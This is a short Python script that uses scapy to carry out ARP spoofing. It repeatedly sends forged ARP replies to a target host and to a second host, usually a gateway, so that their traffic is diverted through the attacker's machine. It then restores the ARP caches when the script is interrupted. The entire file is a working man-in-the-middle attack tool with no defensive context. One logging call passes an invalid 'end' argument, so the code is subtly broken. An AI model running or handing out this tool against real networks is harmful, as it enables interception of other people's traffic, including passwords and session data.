import scapy.all as scapy
import logging
import sys
import time


def get_mac_address(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast_stack = broadcast_packet / arp_packet
    result_list = scapy.srp(arp_broadcast_stack, timeout=10, verbose=False)[0]
    return result_list[0][1].hwsrc


def spoof(target, target_intended_dest):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac_address(target),
                       psrc=target_intended_dest)
    sent_packet = scapy.send(packet)
    logger.info(sent_packet)


def undo_spoof(destination, source):
    destination_mac_address = get_mac_address(destination)
    source_mac_address = get_mac_address(source)
    packet = scapy.ARP(op=2, pdst=destination, hwdst=destination_mac_address,
                       psrc=source, hwsrc=source_mac_address)
    sent_packet = scapy.send(packet)
    logger.info(sent_packet)


if __name__ == '__main__':
    logger = logging.getLogger(__name__)
    logging.basicConfig(level=logging.DEBUG,
                        format="%(asctime)s:%(levelname)s:%(message)s",
                        filename="logs.log",)
    target = sys.argv[1]
    target_intended_dest = sys.argv[2]

    try:
        sent_packets_count = 0
        while True:
            spoof(target, target_intended_dest)
            spoof(target_intended_dest, target)
            sent_packets_count = sent_packets_count + 2
            logger.info("\r[*] Packets Sent "+str(sent_packets_count), end="")
            time.sleep(2)

    except KeyboardInterrupt:
        logger.info("\nCtrl + C pressed - Exiting")
        undo_spoof(target_intended_dest, target)
        undo_spoof(target, target_intended_dest)
        logger.info("[+] Arp Spoof Stopped")
